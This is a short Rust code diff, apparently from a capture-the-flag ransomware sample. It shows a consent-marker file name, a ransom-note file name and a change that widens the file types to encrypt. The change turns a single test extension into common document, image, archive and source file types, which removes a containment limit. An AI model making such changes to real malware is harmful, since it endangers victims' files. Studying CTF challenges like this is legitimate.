@@ -28,11 +28,10 @@ const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
 const CONSENT_MARKER_FILE_NAME: &'static str =
     "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
 const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
-// const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
-//     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
-//     "pptx", "xls", "xlsx",
-// ];
-const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &["ctftest"];
+const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
+    "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
+    "pptx", "xls", "xlsx",
+];
 const QUEUE_SIZE: usize = 1024;
 
 fn get_computer_name() -> Result<String> {
